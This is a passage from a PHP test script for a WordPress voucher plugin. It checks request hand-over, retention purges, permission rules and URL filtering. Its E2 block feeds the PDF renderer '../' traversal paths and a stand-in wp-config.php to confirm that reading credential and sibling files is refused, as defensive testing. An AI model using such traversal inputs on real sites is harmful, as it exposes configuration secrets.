add_action( 'vcap_voucher_request_handed_over', static function ( ...$a ) use ( &$d5_events ) { $d5_events[] = $a; }, 10, 3 );
$d5_ok   = $d5_req->hand_over( $d5_id );
$d5_after = VoucherRequests::get( $d5_id );
$d5_meta  = VoucherRequests::handover( $d5_id );
check( 'Decision D5: success → state handed_over, order id, URL, time and user kept, recipients removed (only the count stays), action without personal data', is_array( $d5_ok ) && 812 === $d5_ok['order_id'] && $d5_answer['url'] === $d5_ok['url'] && false === $d5_ok['replayed'] && VoucherRequests::STATE_HANDED_OVER === $d5_after['state'] && 'handed_over' === VoucherRequests::STATE_HANDED_OVER && array() === $d5_after['recipients'] && 2 === $d5_after['quantity'] && 812 === $d5_meta['order_id'] && $d5_answer['url'] === $d5_meta['url'] && '' !== $d5_meta['at'] && array( array( $d5_id, 812, 0 ) ) === $d5_events, json_encode( array( $d5_ok, $d5_after, $d5_meta ) ) );
$d5_twice = $d5_req->hand_over( $d5_id );
check( 'Decision D5: a second hand-over (double click) answers the same company order without asking the add-on again', is_array( $d5_twice ) && 812 === $d5_twice['order_id'] && true === $d5_twice['replayed'] && 4 === count( $d5_calls ) && 1 === count( $d5_events ) && ! $d5_req->handover_available( $d5_after ) );
// The test stub of delete_post_meta() drops all rows of the key; WordPress keeps the contact's row.
$GLOBALS['vcap_test_meta'][ $d5_id ][ VoucherRequests::EMAIL_META ] = array( 'hr5@acme.example' );
$d5_ex_c = $d5_req->export( 'hr5@acme.example' );
$d5_ex_a = $d5_req->export( 'ann5@acme.example' );
$d5_er   = $d5_req->erase( 'hr5@acme.example' );
check( 'Decision D5: privacy – a handed-over request is exported to the contact like an issued one (status "Handed over to a company order", no recipients), recipients are no longer found here, the eraser blanks the contact', str_contains( $cs_vals( $d5_ex_c ), '|Handed over to a company order|' ) && ! str_contains( $cs_vals( $d5_ex_c ), 'ann5' ) && ! in_array( 'vcap-request-' . $d5_id, array_column( $d5_ex_a['data'], 'item_id' ), true ) && $d5_er['items_removed'] && '' === VoucherRequests::get( $d5_id )['contact']['email'] && 'ACME GmbH' === VoucherRequests::get( $d5_id )['contact']['company'], $cs_vals( $d5_ex_c ) );
$d5_src = (string) file_get_contents( dirname( __DIR__ ) . '/src/Admin/VoucherRequestsAdmin.php' ) . (string) file_get_contents( dirname( __DIR__ ) . '/src/Integrations/VoucherRequests.php' );
check( 'Decision D5: admin-post vcap_request_handover checks the nonce per request; the button is shown only when handover_available(); a handed-over request cannot be issued', str_contains( $d5_src, "add_action( 'admin_post_vcap_request_handover', array( \$this, 'handover' ) );" ) && str_contains( $d5_src, "check_admin_referer( 'vcap_request_handover_' . \$id );" ) && str_contains( $d5_src, "wp_nonce_field( 'vcap_request_handover_' . (int) \$r['id'] );" ) && str_contains( $d5_src, 'if ( $this->requests->handover_available( $r ) ) {' ) && (bool) preg_match( '/public function confirm\(.*?STATE_HANDED_OVER === \$request\[\'state\'\].*?vcap_handed_over.*?STATE_ISSUED === \$request\[\'state\'\]/s', $d5_src ) );
$GLOBALS['vcap_test_filters'] = $cs_filters;

// Decision D10 (16.11.2026): retention of voucher requests in the daily maintenance.
check( 'Decision D10: default retention 6 months for open/partial and 24 months for issued/handed-over requests; the filter can change or switch off (0) each', array( 'open' => 6, 'closed' => 24 ) === VoucherRequests::retention_months() && ( static function () { add_filter( 'vcap_voucher_requests_retention_months', static fn() => array( 'open' => 0, 'closed' => -3 ) ); $m = VoucherRequests::retention_months(); array_pop( $GLOBALS['vcap_test_filters']['vcap_voucher_requests_retention_months'] ); return array( 'open' => 0, 'closed' => 0 ) === $m; } )() && in_array( 'voucher_requests', VCAP\Delivery::MAINTENANCE_STEPS, true ) );
$d10_ids = array();
foreach ( range( 1, 53 ) as $d10_n ) {
	$d10_ids[] = (int) ( $d5_req->submit( array( 'reference' => 'formcaptain:entry:d10-' . $d10_n ) + $d5_in )['request_id'] ?? 0 );
}
$d10_calls = array();
$d10_find  = static function ( array $states, string $before, int $limit ) use ( &$d10_calls, $d10_ids ) {
	$d10_calls[] = array( $states, $before, $limit );
	$left = array_values( array_filter( $d10_ids, static fn( $id ) => isset( $GLOBALS['vcap_test_posts'][ $id ] ) ) );
	return in_array( 'open', $states, true ) ? array_slice( $left, 0, $limit ) : array();
};
$d10_done = $d5_req->purge_expired( 20.0, $d10_find );
$d10_open_before = strtotime( ( $d10_calls[0][1] ?? '' ) . ' UTC' );
$d10_closed_before = strtotime( ( end( $d10_calls )[1] ?? '' ) . ' UTC' );
check(
	'Decision D10: the purge deletes in batches of 50 (open + partial counted from the receipt or last change older than 6 months, then issued + handed_over older than 24 months) and removes the form-reference claims',
	$d10_done && array( 'open', 'partial' ) === $d10_calls[0][0] && 50 === $d10_calls[0][2] && 2 === count( array_filter( $d10_calls, static fn( $c ) => in_array( 'open', $c[0], true ) ) ) && array( 'issued', 'handed_over' ) === end( $d10_calls )[0]
		&& abs( $d10_open_before - strtotime( '-6 months' ) ) < 120 && abs( $d10_closed_before - strtotime( '-24 months' ) ) < 120
		&& array() === array_filter( $d10_ids, static fn( $id ) => isset( $GLOBALS['vcap_test_posts'][ $id ] ) ) && false === get_option( VoucherRequests::CLAIM_PREFIX . md5( 'formcaptain:entry:d10-7' ), false ),
	json_encode( array_map( static fn( $c ) => array( $c[0], $c[1], $c[2] ), $d10_calls ) )
);
$d10_more = array();
foreach ( range( 1, 60 ) as $d10_n ) {
	$d10_more[] = (int) ( $d5_req->submit( array( 'reference' => 'formcaptain:entry:d10b-' . $d10_n ) + $d5_in )['request_id'] ?? 0 );
}
$d10_calls = array();
$d10_find2 = static function ( array $states, string $before, int $limit ) use ( &$d10_calls, $d10_more ) {
	$d10_calls[] = $states;
	return array_slice( array_values( array_filter( $d10_more, static fn( $id ) => isset( $GLOBALS['vcap_test_posts'][ $id ] ) ) ), 0, $limit );
};
$d10_cut = $d5_req->purge_expired( 0.0, $d10_find2 );
add_filter( 'vcap_voucher_requests_retention_months', static fn() => array( 'open' => 0, 'closed' => 0 ) );
$d10_calls_off = count( $d10_calls );
$d10_off = $d5_req->purge_expired( 20.0, $d10_find2 );
array_pop( $GLOBALS['vcap_test_filters']['vcap_voucher_requests_retention_months'] );
check( 'Decision D10: the purge stops after a batch when its time budget is used (continued by a new action) and does nothing with retention 0', false === $d10_cut && 1 === $d10_calls_off && 10 === count( array_filter( $d10_more, static fn( $id ) => isset( $GLOBALS['vcap_test_posts'][ $id ] ) ) ) && $d10_off && $d10_calls_off === count( $d10_calls ) );
$d10_src = (string) file_get_contents( dirname( __DIR__ ) . '/src/Integrations/VoucherRequests.php' );
$d10_policy = implode( ' ', array_filter( VCAP\Privacy::policy_paragraphs(), static fn( $p ) => str_starts_with( $p, 'Voucher requests:' ) ) );
check( 'Decision D10: the database query reads the last change (or the receipt) per request; privacy text, readme and API.md name the periods and the filter', str_contains( $d10_src, 'COALESCE( u.meta_value, p.post_date_gmt ) < %s' ) && str_contains( $d10_policy, '6 months' ) && str_contains( $d10_policy, '24 months' ) && str_contains( (string) file_get_contents( dirname( __DIR__ ) . '/readme.txt' ), '`vcap_voucher_requests_retention_months`' ) && str_contains( (string) file_get_contents( dirname( __DIR__ ) . '/API.md' ), '`vcap_voucher_requests_retention_months`' ) );
foreach ( $d10_more as $d10_id ) {
	wp_delete_post( $d10_id, true );
}
// D13: the provisional workflow provider contract was taken out of the free core (recoverable from 151786c). The
// voucher commands (VC-1) still book with "workflow:" targets and "vcapcmd:" keys: those stay reserved for the server.
check( 'D13/VC-1: keys "vcapcmd:"/"workflow:" and targets "workflow:" of the voucher commands are reserved for the server (never accepted over REST)', VCAP\API\V1\RestController::is_internal_key( 'vcapcmd:' . str_repeat( 'a', 40 ) ) && VCAP\API\V1\RestController::is_internal_key( 'workflow:abc12345' ) && VCAP\API\V1\RestController::is_internal_target( 'workflow:order:1' ) && ! VCAP\API\V1\RestController::is_internal_target( 'shop:order:1' ) );
// VOUCH-WF-11: guard – the provisional provider contract does not come back into the core (the voucher commands
// vcap_command_* and read functions vcap_read_* of contract 1.3.0 are allowed).
$wf11_hits = array();
$wf11_files = array( dirname( __DIR__ ) . '/voucher-captain.php' );
foreach ( new RecursiveIteratorIterator( new RecursiveDirectoryIterator( dirname( __DIR__ ) . '/src', FilesystemIterator::SKIP_DOTS ) ) as $wf11_file ) {
	if ( 'php' === $wf11_file->getExtension() ) {
		$wf11_files[] = $wf11_file->getPathname();
	}
}
foreach ( $wf11_files as $wf11_path ) {
	$wf11_code = (string) file_get_contents( $wf11_path );
	foreach ( array( 'vcap_' . 'workflow_event', 'Workflow\\' . 'Provider', 'vcap_' . 'workflow_consumer', 'vcap_' . 'workflow_service_allowed', 'vcap_' . 'workflow_handover' ) as $wf11_needle ) { // Split so that git grep finds no trace of the contract in the repository.
		if ( str_contains( $wf11_code, $wf11_needle ) ) {
			$wf11_hits[] = substr( $wf11_path, strlen( dirname( __DIR__ ) ) + 1 ) . ': ' . $wf11_needle;
		}
	}
}
check( 'VOUCH-WF-11: the provisional workflow provider contract (its event hook, consumer filter, handover options, the Workflow provider class) is not in src/ or voucher-captain.php', count( $wf11_files ) > 100 && array() === $wf11_hits && ! is_dir( dirname( __DIR__ ) . '/src/Workflow' ) && ! is_file( dirname( __DIR__ ) . '/WORKFLOW.md' ), implode( ', ', $wf11_hits ) );
echo "Security check (S6–S21, E2)\n";
$sec_src = static fn( string $file ): string => (string) file_get_contents( dirname( __DIR__ ) . '/' . $file );
$s9_rest = $sec_src( 'src/API/V1/RestController.php' );
$s9_svc  = $sec_src( 'src/API/V1/RedemptionService.php' );
check( 'S9: the REST permission check no longer lets a missing redemption through, commit/release/refund pass the access rules and the owner to the service, which checks them again under the row lock', ! str_contains( $s9_rest, 'return true; // Let the callback answer 404' ) && 3 === substr_count( $s9_rest, '$this->customer_args( $request )' ) && 3 <= substr_count( $s9_svc, '$this->access_denied( $row, $args )' ) && (bool) preg_match( '/FOR UPDATE", \$key \), ARRAY_A \); \/\/ phpcs:ignore\s+\$denied\s+= \$row \? \$this->access_denied/', $s9_svc ) );
$s11_open = array( 'user_id' => 0, 'meta' => array( 'email' => 'holder@example.com' ) );
check( 'S11: an open Pass Captain ticket reservation is continued only by the account that made it, by a guest only for the same address, or by staff', VCAP\Compat\PassCaptain\Exchange::may_continue( $s11_open, 0, 'Holder@example.com', false ) && ! VCAP\Compat\PassCaptain\Exchange::may_continue( $s11_open, 0, 'other@example.com', false ) && ! VCAP\Compat\PassCaptain\Exchange::may_continue( $s11_open, 7, 'holder@example.com', false ) && ! VCAP\Compat\PassCaptain\Exchange::may_continue( array( 'user_id' => 0 ), 0, '', false ) && VCAP\Compat\PassCaptain\Exchange::may_continue( $s11_open, 7, 'other@example.com', true ) && VCAP\Compat\PassCaptain\Exchange::may_continue( array( 'user_id' => 7 ) + $s11_open, 7, 'new@example.com', false ) );
check( 'S13: the customer preview refuses password-protected (password not entered), hidden and unpublished products – editors still see published ones', VCAP\Preview::public_product( 'publish', false, 'visible', false ) && VCAP\Preview::public_product( 'publish', false, 'search', false ) && ! VCAP\Preview::public_product( 'publish', true, 'visible', false ) && ! VCAP\Preview::public_product( 'publish', false, 'hidden', false ) && ! VCAP\Preview::public_product( 'draft', false, 'visible', false ) && VCAP\Preview::public_product( 'publish', true, 'hidden', true ) && ! VCAP\Preview::public_product( 'private', false, 'visible', true ) && str_contains( $sec_src( 'src/Preview.php' ), 'self::public_product( (string) get_post_status( $parent_id ), post_password_required( $parent_id )' ) );
$s14_src = $sec_src( 'src/FirstOrderCoupons.php' );
check( 'S14: first-order coupons are held at checkout (classic, Store API, pay page) under a per-customer lock, and open orders holding one count as earlier order', str_contains( $s14_src, "add_action( 'woocommerce_checkout_order_processed', array( \$this, 'hold_classic' )" ) && str_contains( $s14_src, "add_action( 'woocommerce_store_api_checkout_order_processed', array( \$this, 'hold_store_api' )" ) && str_contains( $s14_src, "add_action( 'woocommerce_before_pay_action', array( \$this, 'hold_pay_page' )" ) && str_contains( $s14_src, "SELECT GET_LOCK(%s, 10)" ) && str_contains( $s14_src, 'if ( self::open_order_holds( $user_id, $email, $exclude_order_id, $before ) )' ) && str_contains( $s14_src, "'status'         => array( 'pending' )" ) );
$s17_caps = VCAP\ProductSettings::manager_post_caps();
check( 'S17: voucher settings, PDF templates and field groups need vcap_manage_vouchers or manage_woocommerce (not product rights)', ! VCAP\ProductSettings::may_manage() && 'manage_woocommerce' === $s17_caps['edit_posts'] && 'manage_woocommerce' === $s17_caps['create_posts'] && 'manage_woocommerce' === $s17_caps['delete_others_posts'] && ! in_array( 'edit_products', $s17_caps, true ) && 2 === substr_count( $sec_src( 'src/TemplatePostType.php' ) . $sec_src( 'src/Fields.php' ), "'capabilities'    => ProductSettings::manager_post_caps()," ) && ! str_contains( $sec_src( 'src/TemplatePostType.php' ), "current_user_can( 'edit_products' )" ) && 2 === substr_count( $sec_src( 'src/ProductSettings.php' ), 'if ( self::refuse_without_right(' ) );
$GLOBALS['vcap_test_options'][ VCAP\Compat\AffiliateCaptain::OPTION ] = array( 'Summer flyer' => 'PARTNER1' );
check( 'S18: without wpac_manage_affiliates no codes are generated under a campaign name assigned to a partner; unassigned names are free', str_contains( VCAP\Compat\AffiliateCaptain::generation_refusal( 'Summer flyer' ), 'Summer flyer' ) && '' === VCAP\Compat\AffiliateCaptain::generation_refusal( 'Winter flyer' ) && str_contains( $sec_src( 'src/Admin/CampaignAdmin.php' ), "'coupons' === \$target ? \\VCAP\\Compat\\AffiliateCaptain::generation_refusal( \$name )" ) && str_contains( $sec_src( 'src/Compat/AffiliateCaptain.php' ), "add_action( 'deleted_post', array( \$this, 'forget_empty_campaign' ), 10, 2 );" ) );
unset( $GLOBALS['vcap_test_options'][ VCAP\Compat\AffiliateCaptain::OPTION ] );
$s19_js = $sec_src( 'assets/js/scanner.js' );
preg_match_all( '/href="\' \+ (.*?) \+ \'"/', $s19_js, $s19_hrefs );
check( 'S19: the scanner takes links from the server only with an http(s) scheme (every href goes through safeUrl())', str_contains( $s19_js, 'function safeUrl( u )' ) && str_contains( $s19_js, "return /^https?:\\/\\//i.test( s ) ? s : '';" ) && 2 === count( $s19_hrefs[1] ) && array() === array_filter( $s19_hrefs[1], static fn( $h ) => ! str_starts_with( $h, 'esc( safeUrl( ' ) ) && ! str_contains( $s19_js, 'if ( d.admin_url )' ), json_encode( $s19_hrefs[1] ) );
$s21_doc = $sec_src( 'CONNECTORS.md' );
$s21_ex  = $sec_src( 'examples/vcap-example-connector/vcap-example-connector.php' );
check( 'S21: CONNECTORS.md requires the complete binding in vcap_redemption_allowed and names the key and REST target prefix filters; the example connector registers "example:"', str_contains( $s21_doc, 'bind voucher *and* target completely' ) && str_contains( $s21_doc, '`vcap_rest_redemption_target_prefixes`' ) && str_contains( $s21_doc, '**Register your server-side key prefixes**' ) && str_contains( $s21_ex, "add_filter( 'vcap_internal_redemption_key_prefixes', array( \$self, 'internal_keys' ) );" ) && str_contains( $s21_ex, "array( 'example:' )" ) && str_contains( $s21_ex, 'self::TARGET !== $target' ) );
// E2: dompdf reads local files only from the plugin, the uploads and custom font folders – never ABSPATH, never a
// sibling folder with the same prefix ("uploads-private"), also not through "../".
$e2_uploads = rtrim( $GLOBALS['vcap_test_uploads'], '/' );
$e2_sibling = $e2_uploads . '-private';
@mkdir( $e2_sibling, 0777, true );
file_put_contents( $e2_sibling . '/secret.png', 'x' );
file_put_contents( $e2_uploads . '/e2-ok.png', 'x' );
file_put_contents( ABSPATH . 'wp-config.php', '<?php // test' );
$e2_opts  = PdfRenderer::dompdf_options();
$e2_ok    = static fn( string $f ): bool => true === $e2_opts->validateLocalUri( $f )[0];
$e2_dirs  = PdfRenderer::chroot_dirs();
check(
	'E2: the PDF chroot holds the plugin and the uploads only (no ABSPATH); siblings with a shared prefix and ../ escapes are refused',
	! in_array( realpath( ABSPATH ), $e2_dirs, true ) && in_array( realpath( $e2_uploads ), $e2_dirs, true ) && in_array( realpath( VCAP_PATH ), $e2_dirs, true )
		&& $e2_ok( $e2_uploads . '/e2-ok.png' ) && $e2_ok( 'file://' . $e2_uploads . '/e2-ok.png' ) && $e2_ok( VCAP_PATH . 'voucher-captain.php' )
		&& ! $e2_ok( $e2_sibling . '/secret.png' ) && ! $e2_ok( $e2_uploads . '/../' . basename( $e2_sibling ) . '/secret.png' ) && ! $e2_ok( $e2_uploads . '/../../' . basename( dirname( $e2_uploads ) ) . '/' . basename( $e2_sibling ) . '/secret.png' )
		&& ! $e2_ok( ABSPATH . 'wp-config.php' ) && ! $e2_ok( $e2_uploads . '/../vcap-abspath/wp-config.php' ),
	json_encode( $e2_dirs )
);
$GLOBALS['vcap_test_filters']['vcap_pdf_fonts'][] = array( static fn( $fonts ) => array( 'E2 Font' => array( 'normal' => $e2_sibling . '/secret.png' ) ), 1 );
check( 'E2: the folder of a custom font (vcap_pdf_fonts) is allowed as well', in_array( realpath( $e2_sibling ), PdfRenderer::chroot_dirs(), true ) );
array_pop( $GLOBALS['vcap_test_filters']['vcap_pdf_fonts'] );
@unlink( $e2_sibling . '/secret.png' );
@unlink( $e2_uploads . '/e2-ok.png' );
@unlink( ABSPATH . 'wp-config.php' );
@rmdir( $e2_sibling );

check( 'S6: referral rewards are "Individual use only" (several rewards cannot be stacked)', (bool) preg_match( '/function reward_coupon\(.*?set_individual_use\( true \).*?return \$coupon->save\(\)/s', $sec_src( 'src/Referrals.php' ) ) );

// A6 (free core): the code of the core names no premium offer, upgrade or add-on product – except the hint lines of
// decision S1 (23.11.2026, FREE-PREMIUM.md rule 3), which may name the add-on (src/Admin/ProHints.php), but never as
// an upgrade prompt.
$a6_upsell = array();
foreach ( new RecursiveIteratorIterator( new RecursiveDirectoryIterator( dirname( __DIR__ ) . '/src', FilesystemIterator::SKIP_DOTS ) ) as $a6_file ) {
	$a6_pattern = str_ends_with( $a6_file->getPathname(), '/src/Admin/ProHints.php' ) ? '/upgrade to|go pro\b|pro version|premium feature/i' : '/upgrade to|go pro\b|pro version|premium feature|captain[ -]pro/i';
	if ( 'php' === $a6_file->getExtension() && preg_match( $a6_pattern, (string) file_get_contents( $a6_file->getPathname() ) ) ) {
		$a6_upsell[] = substr( $a6_file->getPathname(), strlen( dirname( __DIR__ ) ) + 1 );
	}
}
check( 'A6: the core code names no premium offer, upgrade or add-on product', array() === $a6_upsell, implode( ', ', $a6_upsell ) );

// Review 16.11.2026 (R16-07): the README table "Was der Kern heute ausgibt" names only actions that exist, with
// the version of docs/HOOKS.md, and the fields it says vcap_voucher_redeemed carries are in the code.
$r07_readme = (string) file_get_contents( dirname( __DIR__ ) . '/README.md' );
$r07_part   = (string) strstr( (string) strstr( $r07_readme, '**Was der Kern heute ausgibt**' ), '## Entwicklung', true );
$r07_ref    = (string) strstr( (string) file_get_contents( dirname( __DIR__ ) . '/docs/HOOKS.md' ), '## Filters', true );
preg_match_all( '/^\| `(vcap_[a-z0-9_]+)` \| (\d+\.\d+\.\d+) \|/m', $r07_part, $r07_rows, PREG_SET_ORDER );
$r07_wrong = array();
foreach ( $r07_rows as $r07_row ) {
	if ( ! str_contains( $r07_ref, '| `' . $r07_row[1] . '` | ' . $r07_row[2] . ' |' ) ) {
		$r07_wrong[] = $r07_row[1];
	}
}
$r07_fire = (string) file_get_contents( dirname( __DIR__ ) . '/src/VoucherRepository.php' ) . (string) file_get_contents( dirname( __DIR__ ) . '/src/API/V1/RedemptionService.php' );
$r07_keys = array( 'voucher_id', 'code', 'user_id', 'amount', 'currency', 'order_id', 'channel', 'committed_at', 'source', 'redemption_key', 'target', 'till', 'receipt', 'state', 'balance_after', 'expires_at', 'created_at', 'meta' );
$r07_lost = array_values( array_filter( $r07_keys, static fn( $k ) => ! str_contains( $r07_fire, "'" . $k . "'" ) || ! str_contains( $r07_part, '`' . $k . '`' ) ) );
check( 'R16-07: the README list of emitted events matches docs/HOOKS.md and the redemption payload in the code', count( $r07_rows ) >= 18 && array() === $r07_wrong && array() === $r07_lost, implode( ', ', array_merge( $r07_wrong, $r07_lost ) ) );

// Review 16.11.2026 (R16-13): the extension points a premium add-on needs exist, every hook names its first version,
// and an add-on can check one contract version. The core knows nothing about the add-on.
$r16_root  = dirname( __DIR__ );
$r16_main  = (string) file_get_contents( $r16_root . '/voucher-captain.php' );
$r16_hooks = (string) file_get_contents( $r16_root . '/docs/HOOKS.md' );
$r16_conn  = (string) file_get_contents( $r16_root . '/CONNECTORS.md' );
preg_match( "/define\( 'VCAP_VERSION', '(\d+\.\d+\.\d+)' \);/", $r16_main, $r16_plugin );
$r16_plugin = $r16_plugin[1] ?? '0.0.0';
preg_match( "/define\( 'VCAP_CONTRACT_VERSION', '(\d+\.\d+\.\d+)' \);/", $r16_main, $r16_contract );
check( 'R16-13: VCAP_CONTRACT_VERSION is defined in the main file, has major 1 (api_v1) and its history is in CONNECTORS.md', isset( $r16_contract[1] ) && str_starts_with( $r16_contract[1], '1.' ) && str_contains( $r16_conn, '`VCAP_CONTRACT_VERSION`' ) && str_contains( $r16_conn, '| ' . ( $r16_contract[1] ?? '?' ) . ' | ' . $r16_plugin . ' |' ), $r16_contract[1] ?? 'not defined' );
preg_match_all( '/^\| `(vcap_[a-z0-9_]+)` \| ([^|]*) \|/m', $r16_hooks, $r16_rows, PREG_SET_ORDER );
$r16_no_since = array();
$r16_since    = array();
foreach ( $r16_rows as $r16_row ) {
	$r16_since[ $r16_row[1] ] = trim( $r16_row[2] );
	if ( ! preg_match( '/^\d+\.\d+\.\d+$/', trim( $r16_row[2] ) ) || version_compare( trim( $r16_row[2] ), $r16_plugin, '>' ) ) {
		$r16_no_since[] = $r16_row[1];
	}
}
check( 'R16-13: every hook in docs/HOOKS.md names its first plugin version, none later than this version', count( $r16_rows ) > 200 && array() === $r16_no_since, implode( ', ', $r16_no_since ) );
$r16_addon = array( 'vcap_admin_menu' => '1.2.0', 'vcap_settings_sections' => '1.2.0', 'vcap_settings_fields' => '1.0.0', 'vcap_template_design' => '1.0.0', 'vcap_report_tabs' => '1.2.0', 'vcap_report_page' => '1.2.0', 'vcap_report_group' => '1.1.0', 'vcap_voucher_links' => '1.2.0', 'vcap_voucher_event' => '1.0.0', 'vcap_voucher_issued_standalone' => '1.2.0', 'vcap_voucher_redeemed' => '1.1.0' );
// The "Since" cells of API.md → "Extension points for add-ons" agree with the generated reference.
$r16_api = (string) strstr( (string) strstr( (string) file_get_contents( $r16_root . '/API.md' ), '## Extension points for add-ons' ), '## Pass Captain', true );
$r16_api_wrong = array();
foreach ( explode( "\n", $r16_api ) as $r16_line ) {
	$r16_cells = explode( ' | ', $r16_line );
	if ( count( $r16_cells ) < 5 || ! preg_match( '/^(\d+\.\d+\.\d+)/', trim( $r16_cells[3] ), $r16_v ) ) {
		continue;
	}
	preg_match_all( '/`(vcap_[a-z0-9_]+)`/', $r16_cells[0], $r16_named );
	foreach ( $r16_named[1] as $r16_name ) {
		if ( isset( $r16_since[ $r16_name ] ) && $r16_since[ $r16_name ] !== $r16_v[1] ) {
			$r16_api_wrong[] = $r16_name . ' (API.md ' . $r16_v[1] . ', HOOKS.md ' . $r16_since[ $r16_name ] . ')';
		}
	}
}
check( 'R16-13: the versions in API.md → "Extension points for add-ons" match docs/HOOKS.md', '' !== $r16_api && array() === $r16_api_wrong, implode( ', ', $r16_api_wrong ) );
check( 'R16-13: the extension points for menu, settings, templates, reports, links and events are documented with their version', array() === array_diff_assoc( $r16_addon, $r16_since ), wp_json_encode( array_diff_assoc( $r16_addon, $r16_since ) ) );
$r16_generator = (string) file_get_contents( $r16_root . '/bin/hooks.php' );
$r16_before    = "<?php\n/**\n * A new hook.\n *\n * @since 1.4.0\n */\n";
preg_match_all( '/^function (vcap_hooks_since|vcap_hooks_with_since)\(.*?^}/ms', $r16_generator, $r16_fn );
eval( implode( "\n", $r16_fn[0] ) ); // phpcs:ignore Squiz.PHP.Eval.Discouraged -- the two pure helper functions of bin/hooks.php (the script itself writes the file).
list( $r16_merged, $r16_missing ) = vcap_hooks_with_since( array( 'vcap_old' => array( 'since' => '' ), 'vcap_new' => array( 'since' => vcap_hooks_since( $r16_before ) ), 'vcap_undocumented' => array( 'since' => vcap_hooks_since( "<?php\n" ) ) ), array( 'vcap_old' => '1.1.0' ) );
check( 'R16-13: the hook reference takes the version from the list or from @since and reports a hook without one', '1.1.0' === $r16_merged['vcap_old']['since'] && '1.4.0' === $r16_merged['vcap_new']['since'] && array( 'vcap_undocumented' ) === $r16_missing, wp_json_encode( $r16_missing ) );

// VC-7 (suite spec 8.1, 4.3, R-4.7, R-5.1): read functions for the state of a voucher by its id – a fixed list of
// keys, null for an unknown id, never a code, a name, an address, the redemption key, the target or meta, no writes.
echo "\nVC-7: read functions (contract 1.2.0)\n";
$vc7_saved_wpdb = $GLOBALS['wpdb'] ?? null;
$GLOBALS['wpdb'] = new VCAP_Test_Wpdb();
$vc7_code        = 'MARKERGIFT-7Q2XK9';
$vc7_secrets     = array( $vc7_code, '7Q2XK9', strtolower( $vc7_code ), hash( 'sha256', $vc7_code ), hash( 'sha256', strtolower( $vc7_code ) ), 'marker.recipient@example.test', 'marker.buyer@example.test', 'Marker Recipient', 'Marker Buyer', 'MARKER MESSAGE', 'markertoken0123456789abcdef0123456789abcdef012345', 'rk-marker-secret-key', 'course:marker-target', 'marker-meta', 'MARKER NOTE', 'Marker till', 'MARKER-RECEIPT', 'MARKER TERMS', 'Marker field' );
// Full rows as SELECT * would return them: the facade must build its answer from the allowed fields only.
$vc7_voucher = static fn( array $over = array() ): array => $over + array(
	'id' => '42', 'code' => $vc7_code, 'coupon_id' => '901', 'type' => 'giftcard', 'status' => 'active', 'order_id' => '1042', 'order_item_id' => '7', 'item_index' => '0',
	'product_id' => '55', 'variation_id' => '0', 'template_id' => '3', 'usage_mode' => 'balance', 'discount_type' => 'fixed_cart', 'initial_amount' => '50.0000',
	'balance' => '12.5000', 'currency' => 'EUR', 'expires_at' => '2029-12-31 23:59:59', 'buyer_name' => 'Marker Buyer', 'buyer_email' => 'marker.buyer@example.test',
	'user_id' => '0', 'recipient_name' => 'Marker Recipient', 'recipient_email' => 'marker.recipient@example.test', 'message' => 'MARKER MESSAGE',
	'fields' => '{"f":{"label":"Marker field","value":"Marker field"}}', 'send_to' => 'recipient', 'delivery_at' => null, 'delivered_at' => '2026-11-01 08:00:00',
	'token' => 'markertoken0123456789abcdef0123456789abcdef012345', 'transferable' => '1', 'terms' => 'MARKER TERMS', 'max_checkins' => '1', 'checkins' => '0',
	'last_checkin_at' => null, 'delivered_roles' => 'recipient,evil', 'created_at' => '2026-11-01 07:59:00', 'updated_at' => '2026-11-02 10:00:00',
);
$vc7_redemption = array( 'id' => '9', 'redemption_key' => 'rk-marker-secret-key', 'voucher_id' => '42', 'user_id' => '17', 'target' => 'course:marker-target', 'amount' => '7.5000', 'state' => 'committed', 'request_hash' => hash( 'sha256', 'x' ), 'meta' => '{"marker-meta":1}', 'expires_at' => '2026-11-02 10:15:00', 'created_at' => '2026-11-02 10:00:00', 'updated_at' => '2026-11-02 10:01:00' );
$vc7_rows = array(
	42 => $vc7_voucher(),
	43 => $vc7_voucher( array( 'id' => '43', 'type' => 'voucher', 'usage_mode' => 'single', 'status' => 'void', 'balance' => '0.0000', 'initial_amount' => '5000', 'currency' => 'JPY', 'delivered_at' => null, 'delivery_at' => '2099-01-01 09:00:00', 'order_id' => '0' ) ),
	44 => $vc7_voucher( array( 'id' => '44', 'type' => 'credit', 'user_id' => '17', 'order_id' => '0', 'balance' => '3.1250', 'currency' => 'KWD' ) ),
);
$GLOBALS['wpdb']->answers = array(
	'/FROM wp_vcap_vouchers WHERE user_id = (\d+) AND type = \'credit\'/' => static fn( $q ) => preg_match( '/user_id = (\d+)/', $q, $m ) && 17 === (int) $m[1] ? $vc7_rows[44] : null,
	'/^SELECT id FROM wp_vcap_vouchers WHERE order_id = (\d+)/'           => static fn( $q ) => preg_match( '/order_id = (\d+)/', $q, $m ) && 1042 === (int) $m[1] ? array( '42', '44' ) : array(),
	'/FROM wp_vcap_vouchers WHERE id = (\d+)/'                            => static fn( $q ) => preg_match( '/WHERE id = (\d+)/', $q, $m ) ? ( $vc7_rows[ (int) $m[1] ] ?? null ) : null,
	'/FROM wp_vcap_redemptions WHERE id = (\d+)/'                         => static fn( $q ) => str_contains( $q, 'WHERE id = 9' ) ? $vc7_redemption : null,
	'/COUNT\(\*\) AS n FROM wp_vcap_redemptions WHERE voucher_id = 42 /'  => array( array( 'state' => 'committed', 'n' => '2' ), array( 'state' => 'released', 'n' => '1' ), array( 'state' => 'bogus', 'n' => '5' ) ),
	'/FROM wp_vcap_redemptions WHERE voucher_id = 42 ORDER BY/'           => array( $vc7_redemption, array( 'state' => 'reserved', 'id' => '8' ) + $vc7_redemption ),
	'/FROM wp_vcap_events WHERE voucher_id = 43 AND event IN/'    => array( array( 'event' => 'delivery_failed', 'created_at' => '2026-11-03 10:00:00', 'note' => 'MARKER NOTE' ), array( 'event' => 'delivery_given_up', 'created_at' => '2026-11-03 11:00:00' ) ),
	'/AND event = \'topup\'/'                                              => '3',
	'/AND event = \'topup_reversed\'/'                                     => '1',
);
$vc7_void_calls = array();
$vc7_read       = new VCAP\API\V1\ReadService(
	new VCAP\VoucherRepository(),
	static function ( Voucher $v ) use ( &$vc7_void_calls ): bool {
		$vc7_void_calls[] = array( $v->id, $v->status, $v->order_id, $v->code, $v->recipient_email );
		return true;
	}
);
$vc7_options    = $GLOBALS['vcap_test_options'] ?? array();
$vc7_transients = $GLOBALS['vcap_test_transients'] ?? array();
$vc7_results    = array(
	'voucher'      => $vc7_read->voucher( 42 ),
	'voucher_str'  => $vc7_read->voucher( '42' ),
	'void'         => $vc7_read->voucher( 43 ),
